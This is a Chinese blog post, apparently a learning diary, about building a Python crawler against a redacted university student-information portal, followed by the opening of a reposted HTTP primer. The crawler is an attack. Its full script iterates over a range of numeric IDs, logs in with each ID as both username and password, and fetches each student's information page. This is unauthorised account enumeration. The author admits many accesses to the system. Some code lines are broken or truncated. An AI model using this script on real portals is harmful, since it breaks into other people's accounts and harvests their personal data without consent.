<h4><span id="爬取页面get包">爬取页面GET包</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /student/studentInfo.jsp?userName=xxxx&amp;passwd=xxxxx HTTP/1.1</span><br><span class="line">Host: xxxx.xxxx.edu.cn</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Referer: http://xxxx.xxxx.edu.cn/servlet/adminservlet</span><br><span class="line">Accept-Encoding: gzip, deflate, sdch</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Cookie: UM_distinctid=15b7be26085454-0504ed9f0e367d-3c365402-100200-15b7be26086832; JSESSIONID=213C06E58934DCED50E4E479858CB055</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
<ul>
<li>看Referer可以看出这个包是由第二个包的页面跳转过来的</li>
<li>userName、passwd这两个参数是账号密码，明文传输</li>
</ul>
<h3><span id="模拟构造请求包">模拟构造请求包</span></h3><p>在写Python代码的过程我尝试着用了面向对象的过程，把相关变量定义为私有变量，在模拟登录的过程中使用到了Requests模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">__header = &#123;</span><br><span class="line">			&apos;User-Agent&apos; : &apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36&apos;,</span><br><span class="line">			&apos;Content-Type&apos;:&apos;application/x-www-form-urlencoded&apos;,</span><br><span class="line">			&apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&apos;,</span><br><span class="line">			&apos;Referer&apos;: &apos;http://xxxx.xxxx.edu.cn/&apos;,</span><br><span class="line">			&apos;Accept-Encoding&apos;: &apos;gzip, deflate&apos;,</span><br><span class="line">			&apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.8&apos;</span><br><span class="line">	&#125;</span><br><span class="line">__data1 = &#123;</span><br><span class="line">			&apos;displayName&apos; : &apos;&apos;,</span><br><span class="line">	  		&apos;displayPasswd&apos; : &apos;&apos;,</span><br><span class="line">	  		&apos;select&apos;: &apos;2&apos;,</span><br><span class="line">	  		&apos;submit.x&apos;: &apos;43&apos;,</span><br><span class="line">	  		&apos;submit.y&apos; : &apos;12&apos;,</span><br><span class="line">	  		&apos;operType&apos; : &apos;911&apos;,</span><br><span class="line">	  		&apos;random_form&apos; : &apos;5129319019753764987&apos;,</span><br><span class="line">	 		&apos;userName&apos; : &apos;&apos;,</span><br><span class="line">	 		&apos;passwd&apos; : &apos;&apos;</span><br><span class="line">	&#125;</span><br><span class="line">__data2 = &#123;</span><br><span class="line">			&apos;isValidate&apos;:&apos;false&apos;,</span><br><span class="line">			&apos;userName&apos;:&apos;&apos;,</span><br><span class="line">			&apos;passwd&apos;:&apos;&apos;,</span><br><span class="line">			&apos;operType&apos;:&apos;911&apos;,</span><br><span class="line">	&#125;</span><br><span class="line">__posturl1 = &apos;http://xxxx.xxxx.edu.cn/renzheng.jsp&apos;</span><br><span class="line">__posturl2 = &apos;http://xxxx.xxxx.edu.cn/servlet/adminservlet&apos;</span><br><span class="line"></span><br><span class="line">__geturl = &apos;http://xxxx.xxxx.edu.cn/student/studentInfo.jsp?userName=&amp;passwd=&apos;</span><br></pre></td></tr></table></figure>
<h3><span id="requests库">Requests库</span></h3><p>Requests是一个Python HTTP库，提供了很多与HTTP相关的方法，我们可以使用dir(requests)查看该库提供的方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import requests</span><br><span class="line">&gt;&gt;&gt; dir(requests)</span><br><span class="line">[&apos;ConnectionError&apos;, &apos;HTTPError&apos;, &apos;NullHandler&apos;, &apos;PreparedRequest&apos;, &apos;Request&apos;, &apos;RequestException&apos;, &apos;Response&apos;, &apos;Session&apos;, &apos;Timeout&apos;, &apos;TooManyRedirects&apos;, &apos;URLRequired&apos;, &apos;__author__&apos;, &apos;__build__&apos;, &apos;__builtins__&apos;, &apos;__copyright__&apos;, &apos;__doc__&apos;, &apos;__file__&apos;, &apos;__license__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;__path__&apos;, &apos;__title__&apos;, &apos;__version__&apos;, &apos;adapters&apos;, &apos;api&apos;, &apos;auth&apos;, &apos;certs&apos;, &apos;codes&apos;, &apos;compat&apos;, &apos;cookies&apos;, &apos;delete&apos;, &apos;exceptions&apos;, &apos;get&apos;, &apos;head&apos;, &apos;hooks&apos;, &apos;logging&apos;, &apos;models&apos;, &apos;options&apos;, &apos;patch&apos;, &apos;post&apos;, &apos;put&apos;, &apos;request&apos;, &apos;session&apos;, &apos;sessions&apos;, &apos;status_codes&apos;, &apos;structures&apos;, &apos;utils&apos;]</span><br></pre></td></tr></table></figure>
<p>在这次过程中主要使用到了Session、get、post和content这几种方法</p>
<h4><span id="session会话对象">Session会话对象</span></h4><p>会话对象让你能够跨请求保持某些参数。它也会在同一个 Session 实例发出的所有请求之间保持 cookie</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = requests.Session()</span><br><span class="line">&gt;&gt;&gt; r = s.get(&quot;https://uknowsec.cn/&quot;)</span><br></pre></td></tr></table></figure>
<h4><span id="get提交方式">GET提交方式</span></h4><p>以GET提交方式请求响应的URL</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; r = requests.get(&quot;https://uknowsec.cn/&quot;,proxies=proxies,timeout=0.001,params=payload)</span><br></pre></td></tr></table></figure>
<ul>
<li><p>params为GET提交方式传递参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r = requests.get(&quot;http://httpbin.org/get&quot;, params=payload)</span><br></pre></td></tr></table></figure>
</li>
<li><p>proxies如果需要使用代理，你可以通过为任意请求方法提供 proxies 参数来配置单个请求:</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">  &quot;http&quot;: &quot;http://10.10.1.10:3128&quot;,</span><br><span class="line">  &quot;https&quot;: &quot;http://10.10.1.10:1080&quot;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">requests.get(&quot;http://example.org&quot;, proxies=proxies)</span><br></pre></td></tr></table></figure>
<ul>
<li>requests在经过以 timeout 参数设定的秒数时间之后停止等待响应:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; requests.get(&apos;http://github.com&apos;, timeout=0.001)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&quot;, line 1, in </span><br><span class="line">requests.exceptions.Timeout: HTTPConnectionPool(host=&apos;github.com&apos;, port=80): Request timed out. (timeout=0.001)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4><span id="post提交方式">POST提交方式</span></h4><p>以GET提交方式请求响应的URL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.post(&quot;http://example.org&quot;, header=header, data=data)</span><br></pre></td></tr></table></figure></p>
<ul>
<li>header是需要的header头部信息</li>
</ul>
<p><a href="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/2017-05-12_163012.png" target="_blank" rel="noopener">header头部信息</a></p>
<p>此处我们只需要添加常见的常见的部分即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&apos;User-Agent&apos; : &apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36&apos;,</span><br><span class="line">&apos;Content-Type&apos;:&apos;application/x-www-form-urlencoded&apos;,</span><br><span class="line">&apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&apos;,</span><br><span class="line">&apos;Referer&apos;: &apos;http://xxxx.xxxx.edu.cn/&apos;,</span><br><span class="line">&apos;Accept-Encoding&apos;: &apos;gzip, deflate&apos;,</span><br><span class="line">&apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.8&apos;</span><br></pre></td></tr></table></figure>
<ul>
<li>data为Post提交的信息</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&apos;displayName&apos; : &apos;&apos;,</span><br><span class="line">&apos;displayPasswd&apos; : &apos;&apos;,</span><br><span class="line">&apos;select&apos;: &apos;2&apos;,</span><br><span class="line">&apos;submit.x&apos;: &apos;43&apos;,</span><br><span class="line">&apos;submit.y&apos; : &apos;12&apos;,</span><br><span class="line">&apos;operType&apos; : &apos;911&apos;,</span><br><span class="line">&apos;random_form&apos; : &apos;5129319019753764987&apos;,</span><br><span class="line">&apos;userName&apos; : &apos;&apos;,</span><br><span class="line">&apos;passwd&apos; : &apos;&apos;</span><br></pre></td></tr></table></figure>
<h4><span id="request部分代码">Request部分代码</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def Firstlogin(self):</span><br><span class="line">	Firstrequest = self.__session.post(self.__posturl1, data=self.__data1, headers=self.__header)</span><br><span class="line"></span><br><span class="line">def Secondlogin(self):</span><br><span class="line">	Secondrequest = self.__session.post(self.__posturl2, data=self.__data2, headers=self.__header)</span><br></pre></td></tr></table></figure>
<h3><span id="beautifulsoup库">BeautifulSoup库</span></h3><p>BeautifulSoup是一个可以从HTML或XML文件中提取数据的Python库.它能够通过你喜欢的转换器实现惯用的文档导航,查找,修改文档的方式,同样可使用dir()查看BeautifulSoup的方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import BeautifulSoup</span><br><span class="line">&gt;&gt;&gt; dir(BeautifulSoup)</span><br><span class="line">[&apos;BeautifulSOAP&apos;, &apos;BeautifulSoup&apos;, &apos;BeautifulStoneSoup&apos;, &apos;CData&apos;, &apos;Comment&apos;, &apos;DEFAULT_OUTPUT_ENCODING&apos;, &apos;Declaration&apos;, &apos;ICantBelieveItsBeautifulSoup&apos;, &apos;MinimalSoup&apos;, &apos;NavigableString&apos;, &apos;PageElement&apos;, &apos;ProcessingInstruction&apos;, &apos;ResultSet&apos;, &apos;RobustHTMLParser&apos;, &apos;RobustInsanelyWackAssHTMLParser&apos;, &apos;RobustWackAssHTMLParser&apos;, &apos;RobustXMLParser&apos;, &apos;SGMLParseError&apos;, &apos;SGMLParser&apos;, &apos;SimplifyingSOAPParser&apos;, &apos;SoupStrainer&apos;, &apos;StopParsing&apos;, &apos;Tag&apos;, &apos;UnicodeDammit&apos;, &apos;__author__&apos;, &apos;__builtins__&apos;, &apos;__copyright__&apos;, &apos;__doc__&apos;, &apos;__file__&apos;, &apos;__license__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;__version__&apos;, &apos;_match_css_class&apos;, &apos;buildTagMap&apos;, &apos;chardet&apos;, &apos;codecs&apos;, &apos;generators&apos;, &apos;markupbase&apos;, &apos;name2codepoint&apos;, &apos;re&apos;, &apos;sgmllib&apos;, &apos;types&apos;]</span><br></pre></td></tr></table></figure>
<h4><span id="解析成xml">解析成XML</span></h4><p>默认情况下,Beautiful Soup会将当前文档作为HTML格式解析,如果要解析XML文档,要在 BeautifulSoup 构造方法中加入第二个参数 “xml”:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">soup = BeautifulSoup(markup, &quot;xml&quot;)</span><br></pre></td></tr></table></figure>
<h4><span id="find_all">find_all()</span></h4><p>find_all() 方法将返回文档中符合条件的所有tag,返回结果是值包含一个元素的列表<br>在实践的过程中由于需要的信息是一个包含在一个tables标签下，由于返回的是列表，利用索引定位到响应的tr位置，而后for循环输出td的内容<br>循环输出tables的代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tables = soup.findAll(&apos;table&apos;)  </span><br><span class="line">tab = tables[0]  </span><br><span class="line">for tr in tab.findAll(&apos;tr&apos;):  </span><br><span class="line">    for td in tr.findAll(&apos;td&apos;):  </span><br><span class="line">        print td.getText(),</span><br></pre></td></tr></table></figure></p>
<h4><span id="python中逗号的作用">Python中逗号的作用</span></h4><p>在find_all()方法循环输出一个table用到了一个逗号，而后了解到了逗号在Python有特殊的作用</p>
<ul>
<li><p>逗号在参数传递中的使用，作为参数的分隔符<br>例如def  abc(a,b)或者abc(1,2)</p>
</li>
<li><p>逗号在类型转化中的使用, 只有当b元组中只有一个元素的时候 ,需要逗号来转换为元组类型</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a=11</span><br><span class="line">&gt;&gt;&gt; b=(a)</span><br><span class="line">&gt;&gt;&gt; b</span><br><span class="line">11</span><br><span class="line">&gt;&gt;&gt; b=(a,)</span><br><span class="line">&gt;&gt;&gt; b</span><br><span class="line">(11,)</span><br><span class="line">&gt;&gt;&gt; b=(a,22)</span><br><span class="line">&gt;&gt;&gt; b</span><br><span class="line">(11, 22)</span><br><span class="line">&gt;&gt;&gt; b=(a,22,)</span><br><span class="line">&gt;&gt;&gt; b</span><br><span class="line">(11, 22)</span><br></pre></td></tr></table></figure>
</li>
<li><p>逗号在输出语句print中的妙用:print语句默认的会在后面加上换行,加了逗号之后,换行就变成了空格</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">for i in range(0,5):</span><br><span class="line">		print i</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line"></span><br><span class="line"> for i in range(0,5):</span><br><span class="line">		print i,</span><br><span class="line"></span><br><span class="line">0 1 2 3 4</span><br></pre></td></tr></table></figure>
<h4><span id="beautifulsoup部分代码">BeautifulSoup部分代码</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Thirdrequest = self.__session.get(geturl)</span><br><span class="line">	page = Thirdrequest.content</span><br><span class="line">	soup = BeautifulSoup(page,&quot;lxml&quot;)</span><br><span class="line">tr = soup.findAll(&apos;tr&apos;)</span><br><span class="line">for i in range(5,14):</span><br><span class="line">	for td in tr[i].findAll(&apos;td&apos;):</span><br><span class="line">		print  td.getText(),</span><br></pre></td></tr></table></figure>
<h3><span id="异常处理">异常处理</span></h3><p>捕捉异常可以使用try/except语句。<br>try/except语句用来检测try语句块中的错误，从而让except语句捕获异常信息并处理。<br>如果你不想在异常发生时结束你的程序，只需在try里捕获它。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">&lt;语句&gt;        #运行别的代码</span><br><span class="line">except &lt;名字&gt;：</span><br><span class="line">&lt;语句&gt;        #如果在try部份引发了&apos;name&apos;异常</span><br><span class="line">except &lt;名字&gt;，&lt;数据&gt;:</span><br><span class="line">&lt;语句&gt;        #如果引发了&apos;name&apos;异常，获得附加的数据</span><br><span class="line">else:</span><br><span class="line">&lt;语句&gt;        #如果没有异常发生</span><br></pre></td></tr></table></figure>
<h4><span id="使用except而不带任何异常类型">使用except而不带任何异常类型</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    正常的操作</span><br><span class="line">   ......................</span><br><span class="line">except:</span><br><span class="line">    发生异常，执行这块代码</span><br><span class="line">   ......................</span><br><span class="line">else:</span><br><span class="line">    如果没有异常执行这块代码</span><br></pre></td></tr></table></figure>
<h4><span id="使用except而带多种异常类型">使用except而带多种异常类型</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    正常的操作</span><br><span class="line">   ......................</span><br><span class="line">except(Exception1[, Exception2[,...ExceptionN]]]):</span><br><span class="line">   发生以上多个异常中的一个，执行这块代码</span><br><span class="line">   ......................</span><br><span class="line">else:</span><br><span class="line">    如果没有异常执行这块代码</span><br></pre></td></tr></table></figure>
<h4><span id="try-finally-语句">try-finally 语句</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">&lt;语句&gt;</span><br><span class="line">finally:</span><br><span class="line">&lt;语句&gt;    #退出try时总会执行</span><br><span class="line">raise</span><br></pre></td></tr></table></figure>
<h3><span id="效果图">效果图</span></h3><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170512171743.jpg" alt=""></p>
<h3><span id="完整代码">完整代码</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># !/usr/bin/python</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import os</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class UCrawler(object):</span><br><span class="line">	&quot;&quot;&quot;docstring for UCrawler&quot;&quot;&quot;</span><br><span class="line">	__header = &#123;</span><br><span class="line">				&apos;User-Agent&apos; : &apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36&apos;,</span><br><span class="line">				&apos;Content-Type&apos;:&apos;application/x-www-form-urlencoded&apos;,</span><br><span class="line">				&apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&apos;,</span><br><span class="line">				&apos;Referer&apos;: &apos;http://xxxx.xxxx.edu.cn/&apos;,</span><br><span class="line">				&apos;Accept-Encoding&apos;: &apos;gzip, deflate&apos;,</span><br><span class="line">				&apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.8&apos;</span><br><span class="line">		&#125;</span><br><span class="line">	__data1 = &#123;</span><br><span class="line">				&apos;displayName&apos; : &apos;&apos;,</span><br><span class="line">		  		&apos;displayPasswd&apos; : &apos;&apos;,</span><br><span class="line">		  		&apos;select&apos;: &apos;2&apos;,</span><br><span class="line">		  		&apos;submit.x&apos;: &apos;43&apos;,</span><br><span class="line">		  		&apos;submit.y&apos; : &apos;12&apos;,</span><br><span class="line">		  		&apos;operType&apos; : &apos;911&apos;,</span><br><span class="line">		  		&apos;random_form&apos; : &apos;5129319019753764987&apos;,</span><br><span class="line">		 		&apos;userName&apos; : &apos;xxxxxxx&apos;,</span><br><span class="line">		 		&apos;passwd&apos; : &apos;xxxxxxx&apos;</span><br><span class="line">		&#125;</span><br><span class="line">	__data2 = &#123;</span><br><span class="line">				&apos;isValidate&apos;:&apos;false&apos;,</span><br><span class="line">				&apos;userName&apos;:&apos;xxxxxxx&apos;,</span><br><span class="line">				&apos;passwd&apos;:&apos;xxxxxxx&apos;,</span><br><span class="line">				&apos;operType&apos;:&apos;911&apos;,</span><br><span class="line">		&#125;</span><br><span class="line">	__posturl1 = &apos;http://xxxx.xxxx.edu.cn/renzheng.jsp&apos;</span><br><span class="line">	__posturl2 = &apos;http://xxxx.xxxx.edu.cn/servlet/adminservlet&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	__session=requests.Session()</span><br><span class="line"></span><br><span class="line">	def Firstlogin(self):</span><br><span class="line">		Firstrequest = self.__session.post(self.__posturl1, data=self.__data1, headers=self.__header)</span><br><span class="line"></span><br><span class="line">	def Secondlogin(self):</span><br><span class="line">		Secondrequest = self.__session.post(self.__posturl2, data=self.__data2, headers=self.__header)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	def PrintAndGet(self):</span><br><span class="line">		a = range(xxxxxxxx,xxxxxxx)</span><br><span class="line">		for tmp in a:</span><br><span class="line">			try:</span><br><span class="line">				username = str(tmp)</span><br><span class="line">				password = str(tmp)</span><br><span class="line">				self.__data1[&apos;userNam&apos;]=username</span><br><span class="line">				self.__data1[&apos;passwd&apos;]=password</span><br><span class="line">				self.__data2[&apos;userNam&apos;]=username</span><br><span class="line">				self.__data2[&apos;passwd&apos;]=password</span><br><span class="line">				Firstrequest = self.__session.post(self.__posturl1, data=self.__data1, headers=self.__header)</span><br><span class="line">				Secondrequest = self.__session.post(self.__posturl2, data=self.__data2, headers=self.__header)</span><br><span class="line">				geturl = http://xxxx.xxxx.edu.cn/student/studentInfo.jsp?userName&apos;+&apos;=&apos;+username+&apos;&amp;&apos;+&apos;passwd=&apos;+password</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">				print &apos;\n&apos;</span><br><span class="line">			except IndexError:</span><br><span class="line">				continue</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line"></span><br><span class="line">	U = UCrawler()</span><br><span class="line">	U.Firstlogin()</span><br><span class="line">	U.Secondlogin()</span><br><span class="line">	U.PrintAndGet()</span><br></pre></td></tr></table></figure>
<h2><span id="总结">总结</span></h2><p>这个编写过程还是蛮久的，毕竟自己的水平太low了，一边找资料一边写代码，然后查相关的知识点。还多次问学长一些很傻逼的问题，贼尴尬有没有，不过学长还是耐心的教我解决问题，在这个过程中学到很多Python的知识，包括相关的库的使用，常见的问题，异常处理等等方面。另外这整个过程中，可能对系统进行了很多次访问，在此表示歉意，并无恶意只是测试而已。</p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[【转载】HTTP：超文本传输协议]]></title>
      <url>https://uknowsec.cn/posts/notes/HTTP%EF%BC%9A%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h1><span id="http简介">HTTP简介</span></h1><p>HTTP协议是Hyper Text Transfer Protocol（超文本传输协议）的缩写,是用于从万维网（WWW:World Wide Web ）服务器传输超文本到本地浏览器的传送协议。</p>
<p>HTTP是一个基于TCP/IP通信协议来传递数据（HTML 文件, 图片文件, 查询结果等）。</p>
<p>HTTP是一个属于应用层的面向对象的协议，由于其简捷、快速的方式，适用于分布式超媒体信息系统。它于1990年提出，经过几年的使用与发展，得到不断地完善和扩展。目前在WWW中使用的是HTTP/1.0的第六版，HTTP/1.1的规范化工作正在进行之中，而且HTTP-NG(Next Generation of HTTP)的建议已经提出。</p>
<p>HTTP协议工作于客户端-服务端架构为上。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。Web服务器根据接收到的请求后，向客户端发送响应信息。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/2964446-5a35e17f298a48e1.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&amp;_=5984001" alt=""></p>
<h1><span id="主要特点">主要特点</span></h1><ul>
<li><p>1、简单快速：客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有GET、HEAD、POST。每种方法规定了客户与服务器联系的类型不同。由于HTTP协议简单，使得HTTP服务器的程序规模小，因而通信速度很快。</p>
</li>
<li><p>2、灵活：HTTP允许传输任意类型的数据对象。正在传输的类型由Content-Type加以标记。</p>
</li>
<li><p>3、无连接：无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。</p>
</li>
<li><p>4、无状态：HTTP协议是无状态协议。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。</p>
</li>
<li><p>5、支持B/S及C/S模式。</p>
</li>
</ul>
<h1><span id="http之url">HTTP之URL</span></h1><p>HTTP使用统一资源标识符（Uniform Resource Identifiers, URI）来传输数据和建立连接。URL是一种特殊类型的URI，包含了用于查找某个资源的足够的信息</p>
<p>URL,全称是UniformResourceLocator, 中文叫统一资源定位符,是互联网上用来标识某一处资源的地址。以下面这个URL为例，介绍下普通URL的各部分组成：</p>
